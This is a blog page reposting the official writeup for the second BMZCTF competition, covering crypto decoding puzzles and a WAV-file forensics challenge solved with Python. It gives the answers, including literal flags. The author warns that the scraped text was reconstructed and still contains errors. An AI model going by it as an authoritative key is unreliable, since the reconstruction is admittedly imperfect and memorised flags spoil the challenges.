<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="200x200" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon32.ico">
  <link rel="icon" type="image/ico" sizes="16x16" href="/images/favicon16.ico">
  <link rel="mask-icon" href="/images/hackerrank.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"harry0597.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
  </script>

  <meta name="description" content="这里对乱码部分&quot;更正&quot;（必有错误，观其大概即可），以方便大家学习">
<meta property="og:type" content="article">
<meta property="og:title" content="第二届BMZCTF网络安全公开赛官方题解">
<meta property="og:url" content="https://harry0597.com/2022/01/07/2nd%C2%B7BMZCTF%C2%B7Writeup/index.html">
<meta property="og:site_name" content="Harry&#39;s Blog">
<meta property="og:description" content="这里对乱码部分&quot;更正&quot;（必有错误，观其大概即可），以方便大家学习">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2022/01/07/hEFw638lt57GTkO.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/a5f6815ea978b709fc8d09d5f8c3f61f.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/084f542cc3283db53456d365ea923425.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/3ce337c2d93eb4598395e07c01caece6.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/8963a22b5c80fef34bf47688662f6bf1.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/c91e647d25050dc856bd311469a2dbc3.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/4a4e4bf39bcff26ae0d78cff44285645.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/9f0b175c44daa14f56b73e4932a75a95.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/b7887888f323c7d8be03283404f65413.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/6076aa36c7012cc5679d7f957e99a674.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/3ee0c28be7749f32a079eb771d6c263d.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/bad51b2ec76a480e287d745ca6eb6097.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/b3fac5ffcec0f7e470f45096d117aebd.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/267a6fc71f6534c17f13739b121e8b1a.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/f1abb18ca4aecc26258ca8c53228f54f.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/97ac4f0778e176f16dcf291e2d99f651.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/28b74790ae267248d819810f0f0c1e0f.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/2f0d987fdde8336b35dc7a00151a7a8c.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/1edc760ab14bda6190b746d31814f5ce.jpeg">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/b425f8fba32fe0f58119b840c6398a00.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/bb374fcbff469dbb2f7e2c569c21785a.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/505b5a31ddc029fd5d4f4cc311cfa6d7.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/ca6b00e454f579de84ef060e4c54b9bf.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/8de23cfa80b08e31c7194f8f2cb15abb.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/500bab9865996f9bc70a2d6f9c348de2.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/c1b0b62c6552420bbb7f4d3ac1df056f.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/b4003b2b4da763fee656756b7255f7ad.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/4154858dde11b6512b5c0d3206418b1a.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/4c202f0874eb180bfb731add0fef5cf8.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/25e5215d13f19c88de3caa996bdd7f74.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/68c3cb7602fbea1e41d2bcfbba3ce550.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/ea6bd1f49da099120945aeebe82f5237.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/b25ba0f52b231ddd6739f838663e25e9.jpeg">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/922ffc457041bfddcf7809b8d1301470.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/43f1bef9a450aad88948debca3cf69a2.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/2d35a497923e5921c632c73962d89ca9.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/34cb11990addaec148f2afa074be62bd.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/85c801350b2db0c58ab725eb1083a170.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/f2206b3cdb470c233c9d59fc0c5dee54.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/ed53183dd2932b646d48ac5d17c41a3a.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/2bcb4f8a60e59df6d42400d4ec203a6d.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/2e341a68aab5ba4b5f8635eb2893db91.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/80fcec9a393e2d66bc34cb9dda799ee4.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/7304d9bbdd94aea3a600332ed35ca993.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/8f3a462d448617b0339aa1be4629637f.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/7d22056e2256095b7f8a0cab9a293fc5.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/a2211938f0da2d0174ef43d5ebd70c10.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/190a309a7df0a174cc9ef33097eca227.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/60089cbed96b738aa34cf0504d017689.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/bfba26a760ee6bdb8ad1913dbe5a7584.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/87ec5f40a9d3765c1984499d600fb42e.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/6e372309031ad7d05a9b0ea6a2ddf093.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/f617dfafb8f07757492d7edcff554fb1.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/4141f8f3e94f896ab726432c81b43e13.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/8dcbdc8d9f73ce93142610aee7d64aa8.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/31b7980b3ba4556d52f2a833b46a36f3.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/e4cea2d48ccdd6059365734dd1702070.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/509ca3d99bfe5659ce2cd3776bab0a0b.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/176fd96b156cf2db16247df1b19f1cc1.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/4d88f6c1447dfa3916135c357aeb1d94.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/be7ed0582766760ea57d955e4dcaf202.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/10e57fee60632e6f4e910df6cd2cf2d9.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/b8687cb3d047e8adb3b36f95b8ef7105.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/ed0c76d9b48bb2342166ffc73c553961.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/34348def85e2d71006b03d51c2738fde.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/f66a24a866877932c18dd93d6adb2856.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/4273dab82e18f9cb945dba1b9a7fdeb8.png?x-oss-process=image/resize,w_670">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/781b1a75dd3ef24fc52c60e2a50d143c.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/4699a5792a35dda6f87016990a27433c.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/33bc7e69c0b8759cde4b2848af1dedcb.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/b888218a3f9de844f8b318253eb9ec53.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/2d4fa61a88fbacb7c1dba407056e19cc.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/faae66076a3575948e6bfdf1ce5de934.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/3d092eff1dfe34508f08ba3f6940185f.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/dae4b5ed126c5090304f498aaba15aed.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/c374267d8d7cb7b3b653679154ca63a0.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/8cca3c21e8b193b78173f0baaf3c0a0e.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/3e191208df8afa3c49845ca048e37537.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/43e96e9d1a05677f2d106b7ecd62fcd8.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/2c0438d8515d1a43b73409c9facbcdbf.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/4d8a095b90fcb4fb23e986c391adf0af.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/2e7a9370749e97e902a3ac81ea391d7b.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/17f5aa862f5a547280bca924f2c3446d.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/8ede99c8cb380eeb449380794b2a7dd4.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/a3d56755ec9e1435510fc2c87ec4f0d8.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/cd409821813dff30bd7d5a8f1ac954e1.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/c0c580cfb1f23829ff50f2e86e347bcd.jpeg">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/51856447b74761e1c26e996ddb1f6a61.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/5b29f4a63247453678dbc986b4558153.png">
<meta property="og:image" content="https://img.shangyexinzhi.com/xztest-image/article/def9ea3247b1514c2cba053e5cbf8da4.jpeg">
<meta property="article:published_time" content="2022-01-06T17:36:27.000Z">
<meta property="article:modified_time" content="2022-01-07T03:17:09.392Z">
<meta property="article:author" content="Harry0597">
<meta property="article:tag" content="Writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2022/01/07/hEFw638lt57GTkO.png">

<link rel="canonical" href="https://harry0597.com/2022/01/07/2nd%C2%B7BMZCTF%C2%B7Writeup/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>第二届BMZCTF网络安全公开赛官方题解 | Harry's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Harry's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">温故知新</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/Harry0597" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://harry0597.com/2022/01/07/2nd%C2%B7BMZCTF%C2%B7Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/IMG_2550.JPG">
      <meta itemprop="name" content="Harry0597">
      <meta itemprop="description" content="Pondering'll do you wonders.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Harry's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          第二届BMZCTF网络安全公开赛官方题解
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-01-07 01:36:27 / 修改时间：11:17:09" itemprop="dateCreated datePublished" datetime="2022-01-07T01:36:27+08:00">2022-01-07</time>
            </span>

          
    <span>&emsp;</span><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span>
    <span class="post-meta-item-text">阅读次数：</span>
    <span id="busuanzi_value_page_pv"></span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2022/01/07/2nd%C2%B7BMZCTF%C2%B7Writeup/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2022/01/07/2nd%C2%B7BMZCTF%C2%B7Writeup/" itemprop="commentCount"></span>
    </a>
  </span>
  
  <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>22k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>20 分钟</span>
            </span>
            <div class="post-description">这里对乱码部分"更正"（必有错误，观其大概即可），以方便大家学习</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="第二届“BMZCTF”网络安全公开赛官方题解"><a href="#第二届“BMZCTF”网络安全公开赛官方题解" class="headerlink" title="第二届“BMZCTF”网络安全公开赛官方题解"></a>第二届“BMZCTF”网络安全公开赛官方题解</h1><h2 id="来自"><a href="#来自" class="headerlink" title="来自"></a>来自</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.shangyexinzhi.com/article/4500310.html">网址</a><br>题解最初发布在<strong>知识星球</strong>，这个网址里是爬虫爬的（我猜），所以有些乱码</p>
<p>这里进行<strong>部分“更正”</strong>（必有错误，观其大概即可），以方便大家学习</p>
</blockquote>
<p>也可以选择加入BMZ的知识星球</p>
<p><img src="https://s2.loli.net/2022/01/07/hEFw638lt57GTkO.png" alt="也可以选择加入BMZ的知识星球"></p>
<hr>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>hex解密 -&gt; 两次base64 解密 -&gt; 一次base32解密</p>
<h3 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h3><ul>
<li>爆破zip文件，得到解压密码2022go</li>
<li>base64解密key.txt,得到密钥babyhappy</li>
<li>利用UE 查看图片内容，在结尾发现一串字符U2FsdGVkX1+IHXoYmwwOhhOsI9mQ2pVFoGA91Ix/58JMsg==</li>
<li>经过尝试分析是RC4 解密，得到结果是flag{You_Guess_It}</li>
</ul>
<h3 id="do-you-nkow-it"><a href="#do-you-nkow-it" class="headerlink" title="do_you_nkow_it"></a>do_you_nkow_it</h3><p>latex符号，将所有符号打出来后取第一个字母连起来就是flag，使用vscode的latex插件可以直接手点出来。</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">flag</span><span class="template-variable">&#123;Play_with_LaTeX&#125;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="easy-misc"><a href="#easy-misc" class="headerlink" title="easy_misc"></a>easy_misc</h3><p><code>what</code>文件开头并不是什么类型的文件头</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/a5f6815ea978b709fc8d09d5f8c3f61f.png" alt="img"></p>
<p>文件尾发 现端倪， <code>RIFF、 WAVE、fmt</code>等字样，很明显这是 <code>wav</code>文件的文件头</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/084f542cc3283db53456d365ea923425.png" alt="img"></p>
<p>用Python简单处理、反转字节流数据等到正确的wav文件 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;what&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f: </span><br><span class="line">	hex_data = hexlify(f.read()).decode()[::-<span class="number">1</span>] </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.wav&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f1:  </span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_data), <span class="number">2</span>):</span><br><span class="line">		data = hex_data[i:i+<span class="number">2</span>][::-<span class="number">1</span>] </span><br><span class="line">		f1.write(unhexlify(data))</span><br></pre></td></tr></table></figure>

<p>得到的wav文件使用 <code>Audacity</code>分析</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/3ce337c2d93eb4598395e07c01caece6.png" alt="img"></p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/8963a22b5c80fef34bf47688662f6bf1.png" alt="img"></p>
<p>通过分析不难发现，每一帧高低频区别明显，高频在一定的范围内，低频也在一定的范围内</p>
<ul>
<li><pre><code>Python wav模块文档：https://docs.python.org/zh-cn/3/library/wave.html#module-wave
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">首先来简单分析下振幅的规律</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">import wave</span><br><span class="line">obj = wave<span class="selector-class">.open</span>(<span class="string">&#x27;data.wav&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">frames = obj<span class="selector-class">.getnframes</span>()</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">&quot;All Frames: &#123;&#125;&quot;</span>.format(frames)</span></span>)</span><br><span class="line">frames_data = obj<span class="selector-class">.readframes</span>(<span class="number">20</span>)<span class="selector-class">.hex</span>()#提取出前<span class="number">20</span>帧的数据</span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">0</span>, len(frames_data), <span class="number">4</span>):  </span><br><span class="line">	data = frames_data<span class="selector-attr">[i:i+4]</span> </span><br><span class="line">	real_data = int(data<span class="selector-attr">[2:]</span> + data<span class="selector-attr">[:2]</span>, <span class="number">16</span>) </span><br><span class="line">	data1 = data<span class="selector-attr">[2:]</span> + data<span class="selector-attr">[:2]</span> </span><br><span class="line">	print(<span class="string">&quot;第&#123;:&lt;2&#125;帧: &#123;&#125; =&gt; &#123;&#125; 真实数据值: &#123;&#125;&quot;</span><span class="selector-class">.format</span>(int((i+<span class="number">4</span>)/<span class="number">4</span>), data,data1 , real_data))</span><br></pre></td></tr></table></figure>
</code></pre></li>
</ul>
<p>提取出来的每一帧的数据大小为 <code>两字节</code>，且存储方式为 <code>小端存储</code>，所以需要高字节位和低字节位换一下，然后转换成数值</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/c91e647d25050dc856bd311469a2dbc3.png" alt="img"></p>
<p>先分析正振幅的数据值，通过多次尝试分析，基本就可以确认高振幅范围为： <code>30000-32000</code>，低振幅范围为： <code>18000-20000</code></p>
<blockquote>
<p>PS：分析高低振幅取值范围可以提升提取出来的帧数来进行更精确的判断</p>
</blockquote>
<p>而负振幅数据无论高振幅还是低振幅，为什么都看起来都不在这个范围之内呢，明明从<code>Audacity</code>中观察到的波形的高低范围和正振幅范围都应该是一样的，而得到的数值确大相径庭呢？</p>
<p>我们知道如果是 <code>带符号的2字节整型</code>的取值范围是： <code>[-2^(15)] ~ [2^(15)-1]</code>也就是 <code>-32768至32767之间</code></p>
<p>那么就能解释负振幅数据的问题了，很明显发生了溢出；需要对数值进行一个转换处理即可得到在范围内的正常的数据</p>
<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python"><span class="keyword">import</span> math</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">math.<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">15</span>)-(<span class="number">45650</span>-math.<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">15</span>))<span class="number">19886.0</span><span class="comment">#第二帧</span></span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">math.<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">15</span>)-(<span class="number">47417</span>-math.<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">15</span>))<span class="number">18119.0</span><span class="comment">#第三帧</span></span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">math.<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">15</span>)-(<span class="number">33915</span>-math.<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">15</span>))<span class="number">31621.0</span><span class="comment">#第五帧</span></span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">math.<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">15</span>)-(<span class="number">35258</span>-math.<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">15</span>))<span class="number">30278.0</span><span class="comment">#第十二帧</span></span></span><br></pre></td></tr></table></figure>

<p>OK，这样就解决了负振幅数据转换的问题 接下来就直接使用Python简单处理，将高低振幅转换成二进制数据即可；然后将得到的二进制数据写成字节流转成文件</p>
